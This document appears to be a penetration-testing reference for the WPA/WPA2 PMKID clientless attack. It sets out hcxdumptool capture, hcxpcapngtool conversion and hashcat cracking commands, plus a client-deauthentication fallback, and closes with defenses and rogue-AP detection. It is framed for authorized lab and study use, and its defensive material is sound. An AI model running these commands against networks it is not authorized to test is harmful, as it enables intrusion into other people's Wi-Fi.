# PMKID Clientless Attack — Command-First Reference

> **Scope / authorization.** This note is for **authorized** work only: your own gear, a lab
> you own, sanctioned CTF/competition targets, or OSWP study. Every target BSSID must be on
> your written **allowlist** before you transmit a single association request. The toolkit is
> allowlist-gated by design — enforce it with a BPF filter (below), not just good intentions.
> Each attack here is paired with its **defense**. Evil-twin is covered as **detection + concept
> only** — this toolkit never builds a credential harvester.

---

## 1. Concept (brief)

WPA/WPA2-PSK derives a **Pairwise Master Key (PMK)** from the passphrase + ESSID
(`PMK = PBKDF2(HMAC-SHA1, passphrase, ssid, 4096, 256)`). When roaming/PMK-caching is enabled,
the AP advertises a **PMKID** inside the **RSN Information Element** of the *first* EAPOL frame
it sends (conceptually "M1"), computed as:

```
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```

The attacker associates to the AP, grabs that one frame, and now holds a value that is a direct
function of the PMK. No client, no full 4-way handshake, no deauthentication of real users —
hence **clientless**. The PMKID is then cracked **offline** (the AP never sees the guesses), so
the *only* thing standing between the capture and the PSK is passphrase strength and your GPU.

Disclosed by Jens "atom" Steube (hashcat) in Aug 2018. Originally hashcat **-m 16800**; the
current format is **-m 22000** (16800/2500 are deprecated).

**Advantages over the classic EAPOL-handshake attack** (per the original disclosure):
no waiting for a user to connect, no EAPOL retransmission noise, no risk of a user typing a bad
password into the capture, and (with PMF off) no deauth needed.

**Limits:** works against `802.11i/p/q/r` networks **with roaming / PMK caching enabled**
("most modern consumer routers," but not all). **Fails** against WPA3-SAE, against many
PMF-required deployments, and against WPA-Enterprise (802.1X/RADIUS) the same way.

---

## 2. Toolchain & install (Kali)

```bash
sudo apt update
sudo apt install -y hcxdumptool hcxtools hashcat
# verify versions — the CLI changed a LOT at hcxdumptool 6.3.0
hcxdumptool -v
hcxpcapngtool -v
hashcat --version
```

Canonical pipeline (ZerBea):

```
hcxdumptool  →  hcxpcapngtool  →  hcxhashtool (+ hcxpsktool / hcxeiutool)  →  hashcat / JtR
  (capture)      (→ .hc22000)       (filter/select/gen)                        (crack)
```

hcxtools binaries you will actually touch:

| tool            | job |
|-----------------|-----|
| `hcxpcapngtool` | convert pcapng/pcap/cap → hashcat 22000 + extract ESSID/identity wordlists |
| `hcxhashtool`   | filter / select / summarize / de-dupe a `.hc22000`; test a PSK/PMK |
| `hcxpsktool`    | generate candidate passphrases (vendor-default patterns, ESSID+MAC) |
| `hcxeiutool`    | build digit/hex/char wordlist variants from an ESSID list |
| `hcxpmktool`    | check whether a PSK/PMK matches a 22000 line |
| `whoismac`      | OUI/vendor lookup for a MAC (recon + default-pattern hints) |

---

## 3. Hardware reality check (RTL8188EUS + Mac/VM)

hcxdumptool needs **monitor mode + full frame injection**, and it drives the **physical**
interface itself (sets monitor mode, random MAC, channel hopping).

- **Chipsets known-good** (ZerBea README): Realtek `rtl8xxxu`/`rtw88`, older Atheros `ath9k_htc`,
  Ralink `rt2800usb`. **MediaTek `mt76`**: driver-dependent, *active monitor mode is broken* on
  some kernels. **Not recommended:** Intel, Qualcomm, Broadcom (no injection in the mainline
  kernel), PRISM, and PCIe cards.
- **Your TP-Link RTL8188EUS (2.4 GHz):** the in-kernel `rtl8xxxu` driver historically handles the
  8188EUS **poorly for injection**. In practice you usually need the out-of-tree **8188eu** driver
  (Realtek's, or the `aircrack-ng`/`morrownr 8188eu` DKMS branch) for reliable monitor + inject.
  Test before you trust it (see §4.0). It is 2.4 GHz-only — fine for most PMKID work, but you
  cannot touch 5/6 GHz-only APs with it.
- **Kernel/toolchain:** hcxdumptool 6.3.x wants **kernel ≥ 5.15**.

**VM caveats (Mac host → Kali guest):**
- The Mac's built-in Wi-Fi **cannot** be put in monitor mode from the guest. You need the USB
  adapter **passed through** to the VM (VMware/VirtualBox USB passthrough; VirtualBox needs the
  Extension Pack). Attach it *after* Kali has booted; confirm with `iw dev` / `lsusb`.
- On **Apple Silicon** there is no USB passthrough in most hypervisors — run Kali on an
  **x86 host / bare-metal / Raspberry Pi**, or a spare Linux box, for the capture leg. Do the
  **cracking** leg on the Mac GPU (hashcat Metal) — capture and crack do not need to be the
  same machine.
- **Never run hcxdumptool on a virtual/logical interface** (hashcat wiki: *"Don't run hcxdumptool
  on a virtual interface"*; README: *"do not use a logical interface and leave the physical in
  managed mode"*). It must own the real `wlanX`.

---

## 4. Capture — hcxdumptool

### 4.0 Pre-flight (always)

```bash
# 1. free the interface — hcxdumptool manages it itself
sudo systemctl stop NetworkManager
sudo systemctl stop wpa_supplicant
# (ZerBea ships example helper scripts: stopnm / startnm)

# 2. confirm the adapter + driver, and that it can do monitor mode
iw dev
iw list | grep -A8 "Supported interface modes"   # look for 'monitor'

# 3. DO NOT: airmon-ng, iwconfig, iw ... set monitor, or macchanger.
#    hcxdumptool sets monitor mode and uses its own random MAC space — those tools only break it.
```

### 4.1 Modern capture (hcxdumptool 6.3.x — what current Kali ships)

The 6.3 CLI replaced the old `--enable_status`/`--filterlist_ap` world. Canonical capture
(straight from the hashcat wiki):

```bash
sudo hcxdumptool -i wlan0 -w dump.pcapng --rds=1 -F
#   -i wlan0      physical interface
#   -w dump.pcapng  write capture (pcapng is REQUIRED for 22000 metadata)
#   --rds=1       real-time display, sorted (watch PMKID/EAPOL land live)
#   -F            use all available frequencies (full channel scan of your regdom)
# Ctrl-C to stop once you see your authorized AP(s) report a PMKID.
```

Attack behavior in 6.3 is **on by default** and tuned by *disabling* pieces (README):

| effect | flag |
|--------|------|
| request PMKID via association | **on**; disable with `--associationmax=0` |
| client disassociation | **on**; disable with `--disable_disassociation` |
| M2/EAPOL (handshake) attack | **on**; disable with `--m2max=0` |

For a **quiet, PMKID-only, allowlist-scoped** run (no disassoc of real users):

```bash
sudo hcxdumptool -i wlan0 -w dump.pcapng --rds=1 \
     --disable_disassociation --bpf=allowlist.bpf
```

### 4.2 Allowlist enforcement with a BPF filter (do this on any shared RF space)

ZerBea: when you can't control the environment, a Berkeley Packet Filter is **mandatory** so you
only ever transmit at / capture your authorized BSSID(s).

```bash
# build a BPF that restricts to your authorized AP MAC(s); -ddd emits the bytecode hcxdumptool reads
tcpdump -s0 "wlan addr3 11:22:33:44:55:66 or wlan addr3 aa:bb:cc:dd:ee:ff" -ddd > allowlist.bpf
sudo hcxdumptool -i wlan0 -w dump.pcapng --rds=1 --bpf=allowlist.bpf
# (verify the exact --bpf usage against docs/bpf.md for YOUR installed version)
```

### 4.3 Target a single channel (faster, less noisy than full -F scan)

```bash
sudo hcxdumptool -i wlan0 -w dump.pcapng --rds=1 -c 6   # lock to channel 6 (your AP's channel)
```

### 4.4 Legacy capture (hcxdumptool ≤ 6.2.x — if you're on an older image)

Many blog walkthroughs still show the old syntax. Recognize it, but prefer 6.3:

```bash
# ≤6.2.x:
hcxdumptool -o dump.pcapng -i wlan0mon --enable_status=1          # 1 = show PMKID
hcxdumptool -o dump.pcapng -i wlan0mon --enable_status=1 \
            --filterlist_ap=target.txt --filtermode=2             # restrict to BSSID(s) in target.txt
# 2018 original:   hcxdumptool -o test.pcapng -i wlan0 --enable_status
```

> Seeing a `[FOUND PMKID]` / PMKID line for an allowlisted BSSID = done. **One** PMKID per AP is
> all you need. Stop capturing.

---

## 5. Convert — hcxpcapngtool (→ .hc22000)

```bash
hcxpcapngtool -o hash.hc22000 dump.pcapng
# with wordlist extraction (free candidate material from the air):
hcxpcapngtool -o hash.hc22000 -E essidlist dump.pcapng          # ESSIDs seen
hcxpcapngtool -o hash.hc22000 -E essidlist -I idlist -U userlist dump.pcapng
```

hcxpcapngtool prints a summary — read it. It tells you how many **PMKID(s)** and **EAPOL message
pairs** were written, plus ESSIDs. If PMKID count is 0, the AP didn't give one up (PMF/roaming-off
/ not vulnerable) → fall back to the EAPOL path (§8).

Useful flags:
- `-o <file>` → hashcat 22000 (the one you want)
- `-E/-R/-I/-U/-D <file>` → ESSID / probe-req / identity / username / device-info lists
- `--prefix=<base>` → write every list type with one basename (`base.22000`, `base.essid`, …)
- `--all` → write *all* candidate hashes, not just the best. **Caution:** can yield uncrackable
  hashes; hashcat then needs `--nonce-error-corrections >= 8`, and you should filter with hcxhashtool.
- `--add-timestamp` → adds time columns; **strip before hashcat**:
  `awk '{print $1}' hash.hc22000 > hash.clean.hc22000`

**Do NOT:** edit / merge / "clean" pcapng files (wpaclean, aircrack cleaning, cap-merge).
It strips the comment/metadata blocks and breaks bit-error detection. Only tshark/Wireshark may
read them. Gzip is fine (`gzip dump.pcapng`) — all three tools read gzipped captures.

### 5.1 The 22000 hash line (know what you're holding)

```
WPA*01*PMKID*MAC_AP*MAC_CLIENT*ESSID***MESSAGEPAIR      <- PMKID  (what this attack produces)
WPA*02*MIC*MAC_AP*MAC_CLIENT*ESSID*NONCE_AP*EAPOL*MESSAGEPAIR   <- EAPOL (handshake fallback)
```

- `WPA*01` = PMKID. Message-pair bit **1** = PMKID from AP (good). Bit **2** = PSKSHA256 /
  802.11r "FT using PSK" — can be slower/occasionally uncrackable. Bit **4** = from client (mesh/repeater).
- `WPA*02` = EAPOL handshake (the non-clientless fallback).

Split the two types if a capture has both:

```bash
grep 'WPA\*01' hash.hc22000 > pmkid.hc22000      # PMKID only
grep 'WPA\*02' hash.hc22000 > eapol.hc22000       # handshake only
```

---

## 6. Select / filter — hcxhashtool

```bash
hcxhashtool -i hash.hc22000 --info=stdout                 # summarize: BSSID, ESSID, type
hcxhashtool -i hash.hc22000 --essid-group                 # group by network
hcxhashtool -i hash.hc22000 --mac-ap=112233445566 -o target.hc22000   # keep one authorized AP
hcxhashtool -i hash.hc22000 --authorized -o auth.hc22000  # keep only authorized/best pairs
```

Use this to **drop everything that isn't on your allowlist** before cracking, and to keep the
hash file small and clean.

---

## 7. Crack — hashcat (-m 22000) + Mac GPU

**Mode 22000** = WPA-PBKDF2-PMKID+EAPOL (recovers the 8–63 char PSK). **22001** verifies a
precomputed PMK (64 hex). WPA PBKDF2 is a **slow** hash — strategy beats brute force.

```bash
# 0. list devices / benchmark on the Mac GPU (Apple Silicon = Metal backend)
hashcat -I                      # confirm the GPU is seen
hashcat -b -m 22000             # your real h/s rate (budget your attack to it)

# 1. dictionary (start here)
hashcat -m 22000 pmkid.hc22000 rockyou.txt
hashcat -m 22000 pmkid.hc22000 /usr/share/wordlists/rockyou.txt -w 3 -O

# 2. dictionary + rules (cheap force-multiplier)
hashcat -m 22000 pmkid.hc22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule
#   (best64.rule is 'best66.rule' in hashcat 8.0+)

# 3. targeted masks — ISP defaults are often pure digits or known patterns
hashcat -m 22000 pmkid.hc22000 -a 3 ?d?d?d?d?d?d?d?d       # 8-digit PSK (very common)
hashcat -m 22000 pmkid.hc22000 -a 3 -1 ?l?u?d ?1?1?1?1?1?1?1?1

# 4. keep a potfile per engagement; resume-friendly
hashcat -m 22000 pmkid.hc22000 rockyou.txt --potfile-path=engagement.potfile
hashcat -m 22000 pmkid.hc22000 --show --potfile-path=engagement.potfile   # read results back
```

Flags worth keeping on: `-w 3` (workload), `-O` (optimized kernel, caps password len — fine for
WPA ≤ 20-ish, but it changes the keyspace), `--status --status-timer=10`, `-d 1` to pin a device.

**Generate smart candidates instead of brute-forcing** (this is the pro move for PSK):

```bash
# vendor-default / ESSID+MAC derived guesses
hcxpsktool -i hash.hc22000 > candidates.txt
hashcat -m 22000 pmkid.hc22000 candidates.txt

# digit/hex/char variants from the ESSIDs you captured
hcxeiutool -i essidlist -d digits -x xdigits -c chars -s special
cat essidlist digits xdigits chars special | sort -u > wordlist.txt
hashcat -m 22000 pmkid.hc22000 wordlist.txt
```

---

## 8. Decision order (what pros actually do, in order)

1. **Recon + authorize.** Enumerate APs; confirm each target is on the allowlist; note WPA2 vs
   WPA3/transition and whether **PMF** is required. (WPA3-SAE / PMF-required → PMKID likely dead;
   don't waste time.)
2. **PMKID first** — it's clientless, fast, and quiet: §4 capture → §5 convert → check PMKID count.
3. **Got `WPA*01`?** Go straight to §7 cracking. Done.
4. **No PMKID?** (PMF, roaming off, AP doesn't cache, non-vulnerable firmware) → fall back to the
   **EAPOL 4-way handshake** (`WPA*02`): capture with a real client present; if PMF is **off** you
   may deauth a client to force a reconnect (`--disable_disassociation` *off*); convert the same way.
   If PMF is **on**, deauth is blocked — wait for a natural (re)association instead.
5. **Crack** cheapest-first: vendor-default/`hcxpsktool` → targeted masks (8-digit, phone, ESSID-based)
   → dictionaries → dictionary+rules → broad masks **last** (slow hash: full `?a?a?a?a?a?a?a?a` is
   usually infeasible, so rely on intel about the PSK pattern).

---

## 9. Gotchas / pitfalls

- **Pcapng only, never touch it.** 22000 metadata lives in pcapng comment blocks — don't merge,
  clean, or convert captures; don't use `--enable_status` capture filters mid-run.
- **Virtual interface = no.** hcxdumptool must own the physical `wlanX`; a logical/mon interface
  or a VM virtual NIC breaks it.
- **Don't mix tools on the same interface.** No aircrack-ng/reaver/bully/airmon-ng/macchanger
  running alongside hcxdumptool (only Wireshark/tshark may read-along).
- **8188EUS injection** may silently not inject with the stock driver → you'll see beacons but
  never a PMKID. Prove injection works first; install the out-of-tree 8188eu driver if needed.
- **`--all` + `--nonce-error-corrections`/`--ignore-ie`** can create *uncrackable* hashes
  (man page warns). Prefer the default "best hash only" unless you know why you need `--all`.
- **FT-PSK (802.11r) PMKIDs** (message-pair bit 2) can be slower or not crackable — filter them if
  they clog the run.
- **PMKID is not universal.** The original authors: *"we do not know for which vendors or how many
  routers this will work."* Expect `802.11i/p/q/r + roaming`; don't assume every AP leaks one.
- **WPA-Enterprise (RADIUS)** does not fall to this PSK-style PMKID crack.
- **Legacy mode confusion:** `-m 16800`/`-z`/`hcxpcaptool` are **deprecated**. Use `-m 22000`,
  `-o`, `hcxpcapngtool`. If a tutorial uses the old names, translate.
- **`--add-timestamp` breaks hashcat** until you strip the extra column (see §5).

---

## 10. DEFENSE (pair every attack with this)

PMKID cracking is **offline** — once a PMKID leaks, the AP can't rate-limit or lock out the
attacker. So defense is "don't leak it" + "make the offline crack hopeless":

1. **Passphrase entropy is the real control.** A long, random PSK (≥ 20 chars or a 5–6 random-word
   passphrase) makes dictionary/mask/rules attacks and realistic GPU budgets fail. Weak/ISP-default
   PSKs are the whole game — rotate off vendor defaults.
2. **Move to WPA3-SAE** (Dragonfly): the PMK isn't recoverable from a captured PMKID the way WPA2-PSK
   is, so offline PMKID cracking **does not apply**. Avoid WPA3 *transition* mode (it still exposes a
   WPA2 PMK); go WPA3-only where you can.
3. **Require PMF / 802.11w.** PMF stops the deauth leg of the handshake fallback and hardens the
   association exchange. (Note: PMF alone does not always suppress the PMKID in the RSN IE — combine
   it with the next item.)
4. **Disable PMK caching / roaming (PMKID transmission)** if the AP exposes it. Some vendors added an
   explicit toggle after 2018 (e.g. MikroTik's *Disable PMKID* option; many enterprise controllers can
   turn off OKC/802.11r where unneeded). Caveat: a weak PSK is still weak even with PMKID off.
5. **WPA2/3-Enterprise (802.1X/EAP)** instead of a shared PSK removes the single-PMK-from-passphrase
   target entirely for most of the fleet.
6. **Detection / monitoring (incl. evil-twin — DETECTION + CONCEPT ONLY):**
   - Watch for **association floods / bursts of association requests from many random/consecutive MACs**
     — hcxdumptool uses its own random MAC space, which is a tell. A WIDS/WIPS (e.g. Kismet, nzyme) can
     alert on this and on **deauth storms**.
   - **Evil-twin concept:** an attacker stands up a rogue AP cloning your ESSID (and sometimes BSSID)
     to lure clients. **We build detection, never a harvester.** Detect it by watching for a
     **duplicate ESSID on an unexpected BSSID/channel**, sudden signal-strength anomalies, a second AP
     advertising your SSID, karma/beacon-flood behavior, and unexpected DHCP/gateway on your SSID.
     Tooling: Kismet alerts, nzyme, `airodump-ng` BSSID/channel review, periodic authorized-BSSID
     inventory diffs.

---

## 11. Minimal end-to-end (own lab, one allowlisted AP)

```bash
sudo systemctl stop NetworkManager wpa_supplicant
tcpdump -s0 "wlan addr3 AA:BB:CC:DD:EE:FF" -ddd > allow.bpf
sudo hcxdumptool -i wlan0 -w lab.pcapng --rds=1 --disable_disassociation --bpf=allow.bpf   # Ctrl-C on PMKID
hcxpcapngtool -o lab.hc22000 lab.pcapng
grep 'WPA\*01' lab.hc22000 > lab.pmkid.hc22000
hashcat -b -m 22000                                   # know your rate
hashcat -m 22000 lab.pmkid.hc22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule -w 3
hashcat -m 22000 lab.pmkid.hc22000 --show
sudo systemctl start wpa_supplicant NetworkManager
```

---

## Sources

Primary / official (read in full):
- hashcat wiki — *Cracking WPA/WPA2* (mode 22000 workflow, capture/convert/crack, caveats): https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2
- hashcat forum — *New attack on WPA/WPA2 using PMKID* (original disclosure by atom; PMKID formula, -m 16800): https://hashcat.net/forum/thread-7717.html
- ZerBea **hcxdumptool** README (6.3 CLI, chipset support, do-not list, pipeline): https://github.com/ZerBea/hcxdumptool
- ZerBea **hcxtools** (tool set / pipeline): https://github.com/ZerBea/hcxtools
- **hcxpcapngtool(1)** man page (flags, 22000 line format, message-pair bits, warnings): https://manpages.debian.org/testing/hcxtools/hcxpcapngtool.1
- Kali Tools — **hcxtools** (package contents, example commands): https://www.kali.org/tools/hcxtools/

Technique write-ups / cross-checks (read / snippet):
- evilsocket — *Pwning WPA/WPA2 with bettercap and the PMKID client-less attack* (bettercap `wifi.recon`/`wifi.assoc`): https://evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack
- bettercap docs — wifi module (RSN PMKID clientless): https://bettercap.org/modules/wifi
- Hacking Articles — *Wireless Pentesting: PMKID Attack* (hcxdumptool/hcxpcaptool/hashcat sequence, clientless framing): https://www.hackingarticles.in/wireless-penetration-testing-pmkid-attack

Defense / vendor:
- Kaspersky — *Wi-Fi hacking using PMKID interception* (mitigations: strong PSK, disable PMKID, WPA3 not susceptible): https://www.kaspersky.com/blog/wi-fi-pmkid-attack/50790/
- medo64 — *Attacking WPA2 PSK and the MikroTik fix* (Disable-PMKID firmware option): https://medo64.com/posts/attacking-wpa2-psk-and-mikrotik-fix
- MikroTik forum — *New attack on WPA/WPA2… most modern routers* (roaming / affected scope): https://forum.mikrotik.com/t/new-attack-on-wpa-wpa2-discovered-most-modern-routers-might-be-at-risk/122120

> Version note: hcxdumptool/hcxtools flags changed significantly at hcxdumptool 6.3.0 and across
> hcxtools 6.x→7.x. Always confirm against `hcxdumptool -h` / `hcxpcapngtool -h` on *your* install.
